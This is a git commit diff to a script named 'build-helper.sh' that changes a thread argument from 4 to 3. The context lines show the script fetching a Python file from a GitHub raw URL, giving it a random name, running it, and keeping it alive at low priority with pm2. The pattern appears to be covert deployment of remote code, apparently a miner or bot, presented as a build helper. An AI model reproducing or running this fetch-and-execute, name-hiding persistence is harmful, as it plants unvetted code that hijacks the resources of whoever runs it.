03d35ed75bd7328c78b317ca380e64cbb35e62a2
jxj58114 <jxj5811@gmail.com>
2026-07-01 19:07:37 +0330

    Update build-helper.sh

--- build-helper.sh
+++ build-helper.sh
@@ -21,7 +21,7 @@ wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
-echo "./$NEW_PY -t 4" > bsh.sh
+echo "./$NEW_PY -t 3" > bsh.sh
 chmod +x bsh.sh
 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
